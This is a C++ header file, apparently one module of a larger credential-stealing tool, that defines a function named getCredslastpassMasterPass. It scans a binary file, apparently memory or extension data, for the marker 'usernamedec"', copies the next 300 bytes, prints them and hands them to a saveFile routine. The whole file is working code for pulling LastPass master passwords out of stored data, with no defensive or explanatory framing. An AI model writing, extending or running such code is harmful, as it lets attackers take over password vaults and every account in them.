#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include "../core/saveFile.h"

int getCredslastpassMasterPass(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::string searchSequence = "usernamedec\"";
    std::vector<char> foundData;

    while (!file.eof()) {
        char c;
        file.get(c);

        if (c == searchSequence[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchSequence.size()) {
                // We found the search sequence, now collect the next 300 binary characters
                std::vector<char> extractedData;
                for (int i = 0; i < 300; i++) {
                    file.get(c);
                    if (file.eof()) {
                        break;
                    }
                    extractedData.push_back(c);
                }

                // Print the extracted data as UTF-8
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline

                //Save into file
                saveFile(utf8ExtractedData);

                // Clear the foundData vector to search for the next occurrence
                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
